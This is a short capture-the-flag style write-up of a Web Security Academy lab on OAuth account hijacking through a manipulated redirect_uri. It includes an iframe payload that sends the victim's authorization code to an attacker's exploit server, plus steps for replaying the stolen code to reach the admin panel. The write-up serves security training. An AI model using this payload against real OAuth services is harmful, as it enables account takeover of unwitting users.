# OAuth account hijacking via redirect_uri

## Exploit Server
```html
<iframe src="https://oauth-ac9e1f0c1fe83ea4c0a70c8f024d00f8.web-security-academy.net/auth?client_id=ydk8wsd7pqjc6boa4g8ue&redirect_uri= https://exploit-aced1fa71f813ecec0300c1c017300ae.web-security-academy.net/&response_type=code&scope=openid%20profile%20email"></iframe>
```

## Auth FLow
![image](https://user-images.githubusercontent.com/60841283/150680077-ce46a78a-8abf-4bf3-9886-d410174a7dd3.png)

Redirect to Exploit via server

Store --> View Exploit --> Access Logs

![image](https://user-images.githubusercontent.com/60841283/150680163-7a019ad2-9d6f-4115-888f-4f0f39bd7a00.png)

Copy the code and logout from blog website.
Visit --> 
`https://ac971f5c1ff13e4bc00e0c8000a90096.web-security-academy.net/oauth-callback?code=1jnxTwxKscdCXjTs5xKCNXy9MZJIZKo60PcULWE0LcQ`

![image](https://user-images.githubusercontent.com/60841283/150680284-b26b9533-2883-4dbd-97b5-0710f0dd4759.png)

Deliver exploit to victim

![image](https://user-images.githubusercontent.com/60841283/150680340-1489d930-d0f2-4faf-9eb4-4e8d9fcbdd76.png)

Admin Panel
`https://ac971f5c1ff13e4bc00e0c8000a90096.web-security-academy.net/oauth-callback?code=qCmShidBoduqOWzcLOmnJ2VwXd9Hl327TYg227v5Fdv`

![image](https://user-images.githubusercontent.com/60841283/150680399-eac543ea-1503-47ce-9aa3-e89a5ff65c40.png)

![image](https://user-images.githubusercontent.com/60841283/150680411-a9888e2a-70f9-4faa-8e66-0d9d4ab1f7e4.png)
